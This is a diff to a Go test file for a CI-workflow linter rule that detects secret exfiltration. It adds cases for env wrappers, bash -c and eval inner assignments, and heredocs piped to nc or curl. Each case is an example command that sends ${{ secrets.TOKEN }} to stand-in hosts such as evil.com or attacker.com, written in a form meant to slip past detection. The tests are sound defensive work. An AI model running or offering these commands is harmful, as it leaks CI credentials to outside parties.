@@ -1059,6 +1059,150 @@ func TestSecretExfiltration_ParseFailureFallback(t *testing.T) {
 	}
 }
 
+// TestSecretExfiltration_EnvWrapperOperandConsumption verifies that env(1)
+// options taking an operand (-u/--unset NAME, -C/--chdir DIR,
+// -S/--split-string STR) consume that operand so the wrapped network command
+// is still recognized. Without operand consumption, e.g.
+// `env -u OLD_TOKEN curl ...` mis-classifies OLD_TOKEN as the wrapped command
+// and silently drops the curl call.
+func TestSecretExfiltration_EnvWrapperOperandConsumption(t *testing.T) {
+	tests := []struct {
+		name      string
+		runScript string
+		wantErrs  int
+	}{
+		{
+			name:      "env -u short option consumes operand",
+			runScript: `env -u OLD_TOKEN curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
+			wantErrs:  1,
+		},
+		{
+			name:      "env -C short option consumes operand",
+			runScript: `env -C /tmp curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
+			wantErrs:  1,
+		},
+		{
+			name:      "env -S short option consumes operand",
+			runScript: `env -S "FOO=bar" curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
+			wantErrs:  1,
+		},
+		{
+			name:      "env --unset long option consumes operand",
+			runScript: `env --unset OLD_TOKEN curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
+			wantErrs:  1,
+		},
+		{
+			name:      "env --chdir long option consumes operand",
+			runScript: `env --chdir /tmp curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
+			wantErrs:  1,
+		},
+		{
+			name:      "env --unset=NAME inline form does not consume next arg",
+			runScript: `env --unset=OLD_TOKEN curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
+			wantErrs:  1,
+		},
+		{
+			name:      "env -i no-operand option still works",
+			runScript: `env -i curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
+			wantErrs:  1,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			errors := runSecretExfiltrationRuleForTest(tt.runScript, nil)
+			if len(errors) != tt.wantErrs {
+				t.Fatalf("%s: got %d errors, want %d. Errors: %v", tt.name, len(errors), tt.wantErrs, errors)
+			}
+		})
+	}
+}
+
+// TestSecretExfiltration_WrapperInnerAssignment verifies that bash -c / sh -c
+// / eval re-parsing resolves shell assignments inside the wrapped script.
+// The inner script's `TOKEN=${{ secrets.X }}; curl -d "$TOKEN"` form is the
+// natural shell-one-liner shape an attacker would use; outer-script-only
+// resolution leaves it as a silent FN.
+func TestSecretExfiltration_WrapperInnerAssignment(t *testing.T) {
+	tests := []struct {
+		name      string
+		runScript string
+		wantErrs  int
+	}{
+		{
+			name:      "bash -c with inner assignment is detected",
+			runScript: `bash -c 'TOKEN=${{ secrets.TOKEN }}; curl -d "$TOKEN" https://evil.com'`,
+			wantErrs:  1,
+		},
+		{
+			name:      "sh -c with inner assignment is detected",
+			runScript: `sh -c 'TOKEN=${{ secrets.TOKEN }}; curl -d "$TOKEN" https://evil.com'`,
+			wantErrs:  1,
+		},
+		{
+			name:      "eval with inner assignment is detected",
+			runScript: `eval 'TOKEN=${{ secrets.TOKEN }}; curl -d "$TOKEN" https://evil.com'`,
+			wantErrs:  1,
+		},
+		{
+			name:      "bash -c with allowlisted destination plus inner assignment is suppressed",
+			runScript: `bash -c 'TOKEN=${{ secrets.GITHUB_TOKEN }}; curl -H "Authorization: Bearer $TOKEN" https://api.github.com/repos'`,
+			wantErrs:  0,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			errors := runSecretExfiltrationRuleForTest(tt.runScript, nil)
+			if len(errors) != tt.wantErrs {
+				t.Fatalf("%s: got %d errors, want %d. Errors: %v", tt.name, len(errors), tt.wantErrs, errors)
+			}
+		})
+	}
+}
+
+// TestSecretExfiltration_HeredocOnPipeProducer verifies that producer-side
+// heredoc / here-string bodies on the upstream of a pipe flow into PipeInputs.
+// The collectPipeInputArgsInto walker previously dropped *syntax.Redirect
+// nodes silently, so `cat <<EOF | nc attacker 443` lost the heredoc body.
+func TestSecretExfiltration_HeredocOnPipeProducer(t *testing.T) {
+	tests := []struct {
+		name      string
+		runScript string
+		wantErrs  int
+	}{
+		{
+			name:      "heredoc on producer piped to nc is detected",
+			runScript: "cat <<'EOF' | nc attacker.com 443\n${{ secrets.TOKEN }}\nEOF",
+			wantErrs:  1,
+		},
+		{
+			name:      "here-string on producer piped to nc is detected",
+			runScript: `cat <<< '${{ secrets.TOKEN }}' | nc attacker.com 443`,
+			wantErrs:  1,
+		},
+		{
+			name:      "heredoc on producer piped to curl --data-binary @- is detected",
+			runScript: "cat <<'EOF' | curl --data-binary @- https://evil.com\n${{ secrets.TOKEN }}\nEOF",
+			wantErrs:  1,
+		},
+		{
+			name:      "non-stdin redirect (fd 2) heredoc is not collected",
+			runScript: "cat 2<<'EOF' | nc attacker.com 443\n${{ secrets.TOKEN }}\nEOF",
+			wantErrs:  0,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			errors := runSecretExfiltrationRuleForTest(tt.runScript, nil)
+			if len(errors) != tt.wantErrs {
+				t.Fatalf("%s: got %d errors, want %d. Errors: %v", tt.name, len(errors), tt.wantErrs, errors)
+			}
+		})
+	}
+}
+
 func TestSecretExfiltration_EdgeCases(t *testing.T) {
 	tests := []struct {
 		name        string
